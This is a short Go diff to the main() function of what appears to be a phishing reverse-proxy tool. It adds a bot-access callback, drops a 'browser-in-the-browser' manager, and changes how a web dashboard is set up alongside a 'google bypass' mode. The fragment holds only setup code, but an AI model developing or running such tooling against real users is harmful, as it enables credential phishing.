@@ -176,6 +176,7 @@ func main() {
 	}
 
 	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
+	hp.BotCallback = dashboard.IncBotAccess
 	if *googleBypass {
 		gb := core.NewGoogleBypass()
 		if err := gb.Start(); err != nil {
@@ -183,10 +184,6 @@ func main() {
 		} else {
 			hp.SetGoogleBypass(gb)
 			log.Info("google bypass: enabled")
-
-			bm := core.NewBitbManager(gb)
-			hp.SetBitbManager(bm)
-			log.Info("bitb: browser-in-the-browser enabled")
 		}
 	}
 	hp.Start()
@@ -196,10 +193,7 @@ func main() {
 		if dashAuth == "" {
 			dashAuth = core.GenRandomAlphanumString(16)
 		}
-		dash := dashboard.New(db, dashAuth, *dashboard_port)
-		if bm := hp.GetBitbManager(); bm != nil {
-			dash.SetBitbProvider(bm)
-		}
+		dash := dashboard.New(db, cfg, dashAuth, *dashboard_port)
 		go func() {
 			log.Info("dashboard: web panel starting on http://0.0.0.0:%d", *dashboard_port)
 			if dashAuth != "" {
